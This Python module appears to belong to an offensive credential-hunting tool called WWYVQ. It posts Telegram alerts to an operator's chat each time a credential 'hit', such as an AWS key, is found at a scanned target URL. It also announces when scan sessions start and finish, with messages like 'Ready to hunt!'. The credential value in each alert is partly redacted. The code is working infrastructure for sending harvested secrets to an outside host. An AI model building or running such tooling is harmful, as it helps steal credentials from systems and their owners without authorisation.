#!/usr/bin/env python3
"""
🔔 Simple Telegram Hit Notifier for WWYVQ
Basic Telegram notification system for credential hits
Author: wKayaa | 2025
"""

import asyncio
import aiohttp
import os
import json
from datetime import datetime
from typing import Optional, Dict, Any


class TelegramNotifier:
    """Simple Telegram notifier for WWYVQ hits"""
    
    def __init__(self, bot_token: Optional[str] = None, chat_id: Optional[str] = None):
        """
        Initialize Telegram notifier
        
        Args:
            bot_token: Telegram bot token (or use TELEGRAM_BOT_TOKEN env var)
            chat_id: Telegram chat ID (or use TELEGRAM_CHAT_ID env var)
        """
        self.bot_token = bot_token or os.environ.get('TELEGRAM_BOT_TOKEN')
        self.chat_id = chat_id or os.environ.get('TELEGRAM_CHAT_ID')
        self.enabled = bool(self.bot_token and self.chat_id)
        
        if not self.enabled:
            print("⚠️ Telegram notifications disabled - missing bot token or chat ID")
        else:
            print(f"✅ Telegram notifications enabled for chat {self.chat_id}")
    
    async def send_hit_notification(self, hit_data: Dict[str, Any]) -> bool:
        """
        Send a hit notification to Telegram
        
        Args:
            hit_data: Dictionary containing hit information
                     Expected keys: url, credential_type, credential_value, timestamp
        
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        try:
            # Format the message
            message = self._format_hit_message(hit_data)
            
            # Send message
            async with aiohttp.ClientSession() as session:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                
                async with session.post(url, json=payload) as response:
                    if response.status == 200:
                        print(f"✅ Hit notification sent to Telegram")
                        return True
                    else:
                        print(f"❌ Failed to send Telegram notification: {response.status}")
                        return False
                        
        except Exception as e:
            print(f"❌ Error sending Telegram notification: {e}")
            return False
    
    def _format_hit_message(self, hit_data: Dict[str, Any]) -> str:
        """
        Format hit data into a Telegram message
        
        Args:
            hit_data: Hit information dictionary
            
        Returns:
            str: Formatted message
        """
        timestamp = hit_data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        source = hit_data.get('url', 'Unknown')
        cred_type = hit_data.get('credential_type', 'Unknown')
        cred_value = hit_data.get('credential_value', 'Unknown')
        
        # Redact sensitive parts of credential
        if len(cred_value) > 10:
            redacted_value = cred_value[:6] + "..." + cred_value[-4:]
        else:
            redacted_value = cred_value[:3] + "..." if len(cred_value) > 3 else cred_value
        
        message = f"""🎯 <b>WWYVQ HIT DETECTED</b>

📅 Date: {timestamp}
🔗 Source: {source}
🔑 Type: {cred_type}
📊 Value: {redacted_value}

#WWYVQ #Hit #Credential"""
        
        return message
    
    def send_hit_sync(self, hit_data: Dict[str, Any]) -> bool:
        """
        Synchronous wrapper for sending hit notifications
        
        Args:
            hit_data: Hit information dictionary
            
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        try:
            # Create event loop if none exists
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # If loop is already running, create a task
                task = loop.create_task(self.send_hit_notification(hit_data))
                return False  # Return False for async execution
            else:
                # Run in the current event loop
                return loop.run_until_complete(self.send_hit_notification(hit_data))
        except RuntimeError:
            # No event loop, create a new one
            return asyncio.run(self.send_hit_notification(hit_data))
    
    async def send_session_start(self, target_count: int) -> bool:
        """
        Send session start notification
        
        Args:
            target_count: Number of targets to scan
            
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        message = f"""🚀 <b>WWYVQ SCAN STARTED</b>

📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Targets: {target_count}
👤 Operator: wKayaa

Ready to hunt! 💎"""
        
        return await self._send_message(message)
    
    async def send_session_complete(self, stats: Dict[str, Any]) -> bool:
        """
        Send session completion notification
        
        Args:
            stats: Session statistics
            
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        total_hits = stats.get('total_hits', 0)
        targets_scanned = stats.get('targets_scanned', 0)
        duration = stats.get('duration', 'Unknown')
        
        message = f"""✅ <b>WWYVQ SCAN COMPLETED</b>

📊 <b>Results:</b>
🔍 Targets Scanned: {targets_scanned}
💎 Total Hits: {total_hits}
⏱️ Duration: {duration}

🎯 Session Complete! 🚀"""
        
        return await self._send_message(message)
    
    async def _send_message(self, message: str) -> bool:
        """
        Send a message to Telegram
        
        Args:
            message: Message text
            
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                
                async with session.post(url, json=payload) as response:
                    return response.status == 200
                    
        except Exception as e:
            print(f"❌ Error sending Telegram message: {e}")
            return False


def create_notifier_from_config(config_file: str = 'telegram_config.json') -> TelegramNotifier:
    """
    Create a TelegramNotifier from a configuration file
    
    Args:
        config_file: Path to configuration file
        
    Returns:
        TelegramNotifier instance
    """
    try:
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config = json.load(f)
            
            return TelegramNotifier(
                bot_token=config.get('bot_token'),
                chat_id=config.get('chat_id')
            )
        else:
            print(f"⚠️ Config file {config_file} not found, using environment variables")
            return TelegramNotifier()
            
    except Exception as e:
        print(f"❌ Error loading config file: {e}")
        return TelegramNotifier()


# Example usage
if __name__ == "__main__":
    # Example configuration
    notifier = TelegramNotifier()
    
    # Example hit data
    hit_data = {
        'url': 'https://example.com/config.json',
        'credential_type': 'AWS',
        'credential_value': 'AKIA1234567890ABCDEF',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    # Send notification
    success = notifier.send_hit_sync(hit_data)
    print(f"Notification sent: {success}")